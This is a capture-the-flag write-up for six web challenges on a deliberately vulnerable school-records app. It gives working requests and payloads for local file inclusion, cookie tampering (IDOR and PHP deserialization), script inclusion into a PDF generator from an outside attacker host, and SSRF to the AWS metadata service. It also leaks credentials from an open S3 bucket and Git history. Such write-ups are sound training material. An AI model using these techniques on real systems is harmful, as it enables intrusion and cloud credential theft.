# SecTech (6 challenges)

### Summary
1. LFI -> Flag
2. IDOR -> Flag
3. Insecure Deserialization -> Flag
4. XSS in PDF Generator -> Flag
5. SSRF to AWS Metadata -> Flag
6. Misconfigured S3 Bucket -> OSINT of Github Account -> Sensitive Information Disclosure in Git Commits -> Shell on target -> Flag

# GovTech SecTech (1/6) - LFI
### Description
WhiteHacks SecTech is an application for SecTech school staff to login to the system and to view students grades and to generate transcripts. However, could you perhaps view more than transcripts?
### Solution

Notice in the 'View Transcript' functionality - http://sec-tech.cf/transcript.php?user=temp_acc&password=temp_pass&user_id=1&file=transcript.html

There is a 'file' parameter, these types of parameters are usually vulnerable to Local File Inclusion

We can dump the /etc/passwd file - http://sec-tech.cf/transcript.php?user=temp_acc&password=temp_pass&user_id=1&file=/etc/passwd

``````
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List 
Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time 
Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd 
Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:105::/nonexistent:/usr/sbin/nologin avahi:x:105:110:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin 
geoclue:x:106:111::/var/lib/geoclue:/usr/sbin/nologin admin:x:1000:1000:admin:/home/admin:/secret_path/lfi_flag.txt 
``````
Notice the last line?
``````
admin:x:1000:1000:admin:/home/admin:/secret_path/lfi_flag.txt 
``````
Let's visit that - http://sec-tech.cf/transcript.php?user=temp_acc&password=temp_pass&user_id=1&file=/secret_path/lfi_flag.txt 

Flag:
WH2020{Loc@l_F1l3_Inclus10n_buT_N0t_sh3ll}

Note: Alternatively, we can use an SSRF (Part 5) using the file protocol - http://sec-tech.cf/rankings.php?ranking-url=file:///secret_path/lfi_flag.txt 

# GovTech SecTech (2/6) - IDOR
### Description
Insecure Direct Object Reference can have severe repercussions for applications. One mitigation technique is to avoid trusting user input. If you are tired, have some cookies with milk?
### Solution

When we visit anywhere in the webpage we notice in Burp Intruder,
``````
GET /profile.php HTTP/1.1
Host: sec-tech.cf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: sectech=YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MDt9; PHPSESSID=eab13e70980504c609cf4b5b3b8764b8; user_id=c4ca4238a0b923820dcc509a6f75849b
Upgrade-Insecure-Requests: 1
``````
IDOR (Insecure Direct Object Reference) is a easy-to-find yet serious vulnerability affecting web applications. This occurs when user-controlled input is used to access objects in applications

Notice that the user_id in the Cookie: header is a MD5 hash. We can try and search up that hash online - https://md5.gromweb.com/?md5=c4ca4238a0b923820dcc509a6f75849b

``````
The MD5 hash:
c4ca4238a0b923820dcc509a6f75849b
was succesfully reversed into the string:
1
``````
Therefore the we can modify the user_id parameter to a different number - https://www.md5hashgenerator.com/
``````
Your Hash: c81e728d9d4c2f636f067f89cc14862c
Your String: 2
``````
And send it in Burp to profile.php
``````
GET /profile.php HTTP/1.1
Host: sec-tech.cf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: sectech=YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MDt9; PHPSESSID=eab13e70980504c609cf4b5b3b8764b8; user_id= c81e728d9d4c2f636f067f89cc14862c
Upgrade-Insecure-Requests: 1
``````
We can forward it to our browser for viewing
``````
Item 	Value
Name 	Billie Jean
Role 	Perm Staff
Date of Birth 	1st July 1988
Email 	billie_jean@sectech.com.sg
Flag 	WH2020{ID0R_D0_N0T_TRUST_US3R_INPUT}
``````

Flag:
WH2020{ID0R_D0_N0T_TRUST_US3R_INPUT}

# GovTech SecTech (3/6) - Insecure Deserialization
### Description
Trusting serialized data without verification them can be precarious. To this end, we ask that you be like the Cookie Monster, attentive and inquisitive.
### Solution
We notice again in Burp
``````
GET /admin.php HTTP/1.1
Host: sec-tech.cf
User-Agent: XXXXXXX
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: sectech=YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MDt9; PHPSESSID=eab13e70980504c609cf4b5b3b8764b8; user_id= c81e728d9d4c2f636f067f89cc14862c
Upgrade-Insecure-Requests: 1
``````
We have a 'sectech' parameter in the 'Cookie:' header - It looks like a base64 encoded string.
We can use Burp's Decoder functionality to decode it
``````
Input:
YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MDt9
Output: 
a:2:{s:4:"user";s:8:"temp_acc";s:5:"admin";b:0;}
``````
We notice the 'admin' parameter of the body, this means that our access to the admin functionality is determined by user controlled input!!! We can change the parameter to '1' again using Burp's decoder functionality
``````
Input:
a:2:{s:4:"user";s:8:"temp_acc";s:5:"admin";b:1;}
Output: 
YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MTt9
``````
Changing the 'sectech' parameter to our output shown above.
``````
GET /admin.php HTTP/1.1
Host: sec-tech.cf
User-Agent: XXXXXXX
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: sectech=YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MTt9; PHPSESSID=eab13e70980504c609cf4b5b3b8764b8; user_id= c81e728d9d4c2f636f067f89cc14862c
Upgrade-Insecure-Requests: 1
``````
And we receive the flag!
Flag: WH2020{Cook!3Ins3cur3Des3r!al!zat!on_Adm!nR!ghts}

# GovTech SecTech (4/6) - XSS
### Description
Cross site scripting can come in many forms. In the worst case scenario, it may even allow admin credentials to be stolen. We understand the generation of transcript to be a privileged process in WhiteHacks SecTech. Is it truly secure? Try to print out some cookies!
### Solution
XSS vulnerabilities are pretty common in PDF generators which use HTML as input. They can be used to perform an SSRF on a target. This challenged involved the exploitation of 'wkhtmltopdf' a HTML to PDF generator

We notice in Burp on the 'Generate Transcript' functionality 
``````
GET /transcript_write.php?user=temp_acc&password=temp_pass&user_id=1&file=transcript-pdf.html&script=js/remove-margins-before-printing.js HTTP/1.1
Host: sec-tech.cf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sec-tech.cf/grades.php
Connection: close
Cookie: sectech=YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MTt9; PHPSESSID=eab13e70980504c609cf4b5b3b8764b8; user_id=c81e728d9d4c2f636f067f89cc14862c
Upgrade-Insecure-Requests: 1
``````
There is a 'script' parameter being sent as input. We can include an attacker-controlled JavaScript file to be sent to the generator.

We can open up a server on AWS and run a HTTP server.

We can modify our request in Burp to test if the target can visit remote files.
``````
GET /transcript_write.php?user=temp_acc&password=temp_pass&user_id=1&file=transcript-pdf.html&script=http://54.255.179.132/script.js HTTP/1.1
Host: sec-tech.cf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sec-tech.cf/grades.php
Connection: close
Cookie: sectech=YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MTt9; PHPSESSID=eab13e70980504c609cf4b5b3b8764b8; user_id=c81e728d9d4c2f636f067f89cc14862c
Upgrade-Insecure-Requests: 1
``````
We confirm it in the access.log

``````
13.212.44.55 - - [02/Aug/2020:14:06:04 +0000] "GET /script.js HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/602.1 (KHTML, like Gecko) wkhtmltopdf Version/9.0 Safari/602.1"
``````
Time to write a malicious payload in script.js!
``````
document.write(document.cookie)
``````
We visit the URL in our Burp request we used to include script.js in the browser. We can see the session cookie of the PDF generator
``````
PHPSESSID=WH2020{XSS_C4N_C4USE_A_W0RLD_OF_P41N}
``````
Flag: WH2020{XSS_C4N_C4USE_A_W0RLD_OF_P41N}

# GovTech SecTech (5/6) - SSRF

### Solution
SSRF is a vulnerability in which I can get my target server to perform requests for me. It is commonly found in functionality which allows for embedding of images, PDF generators, and much more. It is particularly dangerous as I can use this to bypass firewalls and even perform remote code execution (eg. Redis). This is not only limited to HTTP requests, we could also solve the LFI challenge with an SSRF too!

On the 'Rankings' page, we notice that we can control the URL - http://sec-tech.cf/rankings.php?ranking-url=http://localhost/university-rankings.html

We can use SSRF to query sensitive information about AWS servers from AWS metadata.

If we query  http://sec-tech.cf/rankings.php?ranking-url=http://169.254.169.254/latest/
``````
Output: 
dynamic meta-data user-data 
``````
We can query http://sec-tech.cf/rankings.php?ranking-url=http://169.254.169.254/latest/user-data to receive flag!
``````
Output: 
WH2020{EC2UserData-SSRF} 
``````
Flag: WH2020{EC2UserData-SSRF} 

# GovTech SecTech (6/6) - OSINT
### Description
We love how the system archives past student records - after all, data is gold. If you don't find the gold, we suggest you dig deeper and look beyond the surface, specifically the 'root' :)
### Solution 
The challenge hints to take a look at the past student records functionality. If we use 'Inspect Element' to see where the PDF files came from. We notice that it is stored in a AWS S3 bucket
``````
Excerpt from 'Inspect Element'
<a href="https://sectech-archived-student-records.s3-ap-southeast-1.amazonaws.com/fy2019-20.csv">FY2019-20</a>
``````
The challenge also hints on 'root' - webroot? Let's find out by visiting - https://sectech-archived-student-records.s3-ap-southeast-1.amazonaws.com/

We come accross a XML file containing a directory listing. A file stands out - backup-notes.txt

Visiting it -
``````
To all staff,

In light, of the latest randomware attacks. We need to conduct regular backups. 
While the automated solution is currently a Work-In-Progress, please use the backup script to run the backup task whenever you need to.
I uploaded my script in Github. The Github link has been sent to you guys via the intranet email system. Please refer to that link to get the source code to run the backup.

Please note that this is just a POC script. Don't expect it to create magic!


From Chris Wang
@chriswang-sectech
``````
We can search for the user handle on GitHub - leads us to this - https://github.com/chriswang-sectech/sectech-backup-scripts
Particularly,
``````
# PLEASE USE YOUR ACCOUNT!
ssh chrisw@sec-tech.cf -p 8822
# Enter your password!
``````
In the Git commit history,
``````
## How To

My account `chrisw`:`7cj5dvv4uhBRLIpMNPeT`
``````
We can login via SSH to the specified server to receive a custom-made shell with 4 commands
``````
======= HELP SECTION =======
These are the following commands that can be used by this CustomShell
  help
  list
  print
  exit
======= HELP SECTION =======
``````
We can do a bit of listing and printing of files and we encounter
``````
======= A VERY SIMPLE CUSTOM SHELL =======
Type 'help' to get a list of allowed commands
==========================================
A very simple custom shell> list
total 32
drwxr-xr-x 1 chrisw chrisw 4096 Aug  1 08:31 .
drwxr-xr-x 1 root   root   4096 Jul 21 06:18 ..
drwxr-xr-x 1 root   root   4096 Jul 21 06:18 .aws
-rw-r--r-- 1 chrisw chrisw  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 chrisw chrisw 3771 Apr  4  2018 .bashrc
drwx------ 2 chrisw chrisw 4096 Aug  1 08:31 .cache
-rw-r--r-- 1 chrisw chrisw  807 Apr  4  2018 .profile
A very simple custom shell> list .aws
total 12
drwxr-xr-x 1 root   root   4096 Jul 21 06:18 .
drwxr-xr-x 1 chrisw chrisw 4096 Aug  1 08:31 ..
-rw-rw-r-- 1 root   root    104 Jul 20 19:43 credentials
A very simple custom shell> print .aws/credentials
[default]
aws_access_key_id = YOU_GOT_IT
aws_secret_access_key = WH2020{CR3dent1als_FiL3_IS_ImPT0rt4nt}
``````
Flag: WH2020{CR3dent1als_FiL3_IS_ImPT0rt4nt}


